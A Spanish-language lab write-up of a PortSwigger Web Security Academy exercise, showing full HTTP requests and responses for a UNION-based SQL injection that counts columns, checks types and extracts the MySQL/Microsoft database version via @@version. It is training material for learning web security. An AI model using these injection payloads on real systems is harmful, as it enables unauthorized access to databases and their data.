---
description: >-
  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
---

# Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

Se inicia el laboratorio y al interactuar con los filtros de busqueda:

Se genera la siguiente peticion:

```
GET /filter?category=Food+%26+Drink HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y esto responde con:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8352

```

Asi que procedemos a realizar nuestra primera inyeccion SQL: `'+order+by+1#`

```
GET /filter?category='+order+by+1# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde con:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3905

```

Enviamos la siguiente peticion incrementando el numero a 2:

```
GET /filter?category='+order+by+2# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y lo anterior respondera con:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3905

```

Y finalizamos con el numero 3:

```
GET /filter?category='+order+by+3# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Esta peticion entrega un error:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2554

```

Luego de lo anterior, podemos afirmar que tenemos dos campos para poder retornar data:

Otra forma de validar, es utilizando UNION: `'+UNION+SELECT+NULL#`

```
GET /filter?category='+UNION+SELECT+NULL# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y lo anterior retorna un error:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2554

```

Y si agregamos otro NULL:

```
GET /filter?category='+UNION+SELECT+NULL,NULL# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Se obtiene una respuesta sin codigos de error:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3976

```

Y si incrementamos, obviamente saldra un error:

```
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior, responde asi:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2554

```

Se procede a validar el tipo de dato para cada columna:

```
GET /filter?category='+UNION+SELECT+'Spartan','Cybersecurity'# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y se logra detectar que ambos campos son de tipo STRING:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4108

```

Por lo anterior, finalizamos con la inyeccion que retorna la version:

```
GET /filter?category='+UNION+SELECT+@@version,+NULL# HTTP/2
Host: 0a0f00790407044482581a7e000a008b.web-security-academy.net
Cookie: session=0K44VOczBGqjjsestx2sxen5okKNiH33
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00790407044482581a7e000a008b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
